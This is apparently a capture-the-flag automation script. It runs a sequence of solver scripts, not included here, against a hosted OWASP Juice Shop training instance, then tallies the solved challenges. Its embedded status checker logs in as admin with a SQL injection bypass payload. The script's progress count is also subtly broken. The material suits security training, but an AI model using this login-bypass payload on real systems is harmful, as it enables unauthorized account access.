#!/bin/bash

# Master Solver - Runs all solution scripts in optimal order
# Achieves maximum challenge completion for OWASP Juice Shop

echo "=========================================="
echo "🚀 MASTER JUICE SHOP SOLVER"
echo "=========================================="
echo ""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Base URL
BASE_URL="https://juice3.wonkatech.org"

# Python path
PYTHON="python3"

# Progress tracking
TOTAL_SCRIPTS=0
COMPLETED=0

# Function to run a solver script
run_solver() {
    local script=$1
    local description=$2
    
    echo -e "${YELLOW}Running: $description${NC}"
    echo "Script: $script"
    echo "----------------------------------------"
    
    if [ -f "$script" ]; then
        $PYTHON "$script" 2>&1 | tee -a master_solver.log
        if [ $? -eq 0 ]; then
            echo -e "${GREEN}✅ $description completed${NC}"
            ((COMPLETED++))
        else
            echo -e "${RED}❌ $description failed${NC}"
        fi
    else
        echo -e "${RED}⚠️ Script not found: $script${NC}"
    fi
    
    echo ""
    sleep 2
}

# Clear previous log
> master_solver.log

echo "Starting automated challenge solving..."
echo "Target: $BASE_URL"
echo ""

# Phase 1: Quick wins and basic challenges
echo "=========================================="
echo "PHASE 1: Quick Wins & Basic Challenges"
echo "=========================================="
run_solver "quick_wins.py" "Quick Win Challenges"

# Phase 2: Core exploitation
echo "=========================================="
echo "PHASE 2: Core Exploitation"
echo "=========================================="
run_solver "complete_solver.py" "Basic Challenge Solver"
run_solver "advanced_solver.py" "Advanced Challenge Solver"

# Phase 3: Aggressive techniques
echo "=========================================="
echo "PHASE 3: Aggressive Techniques"
echo "=========================================="
run_solver "aggressive_solver.py" "Aggressive Exploitation"
run_solver "targeted_unsolved.py" "Targeted Unsolved Challenges"

# Phase 4: Browser automation
echo "=========================================="
echo "PHASE 4: Browser Automation"
echo "=========================================="
echo -e "${YELLOW}Note: Browser automation requires Selenium/Playwright${NC}"
run_solver "selenium_complete_automation.py" "Selenium Browser Automation"
run_solver "advanced_browser_automation.py" "Advanced Browser Techniques"

# Phase 5: Visual automation (requires display)
echo "=========================================="
echo "PHASE 5: Visual Automation"
echo "=========================================="
run_solver "visual_automation_solver.py" "Visual Challenge Automation"

# Phase 6: Final push
echo "=========================================="
echo "PHASE 6: Final Push"
echo "=========================================="
run_solver "final_push.py" "Final Push Solver"
run_solver "ultimate_final_solver.py" "Ultimate Final Solver"

# Final status check
echo "=========================================="
echo "📊 FINAL STATUS CHECK"
echo "=========================================="

# Create status checker
cat > check_status.py << 'EOF'
import requests
import json

url = "https://juice3.wonkatech.org"
session = requests.Session()

# Admin login
session.post(f"{url}/rest/user/login", json={"email": "admin@juice-sh.op'--", "password": "x"})

# Get challenges
r = session.get(f"{url}/api/Challenges")
if r.status_code == 200:
    data = r.json()['data']
    total = len(data)
    solved = len([c for c in data if c.get('solved')])
    
    print(f"\n🏆 FINAL SCORE: {solved}/{total} challenges ({solved*100//total}%)")
    
    # Breakdown by difficulty
    by_diff = {}
    for c in data:
        if c.get('solved'):
            diff = c.get('difficulty', 1)
            by_diff[diff] = by_diff.get(diff, 0) + 1
    
    print("\n📈 Breakdown by difficulty:")
    for diff in sorted(by_diff.keys()):
        stars = "⭐" * diff
        print(f"  {stars} Level {diff}: {by_diff[diff]} challenges")
    
    # List some solved challenges
    print("\n✅ Sample of solved challenges:")
    solved_names = [c['name'] for c in data if c.get('solved')][:10]
    for name in solved_names:
        print(f"  • {name}")
        
    if solved < total:
        print(f"\n📝 Remaining: {total - solved} challenges require manual intervention")
else:
    print("❌ Could not retrieve challenge status")
EOF

$PYTHON check_status.py

# Summary
echo ""
echo "=========================================="
echo "📊 MASTER SOLVER SUMMARY"
echo "=========================================="
echo "Scripts executed: $((COMPLETED))/$((TOTAL_SCRIPTS))"
echo "Log file: master_solver.log"
echo ""
echo "Note: Many challenges require:"
echo "  • Manual browser interaction"
echo "  • Visual puzzle solving"
echo "  • Physical QR code scanning"
echo "  • Tutorial completion"
echo "  • Account verification emails"
echo ""
echo "These cannot be fully automated."
echo "=========================================="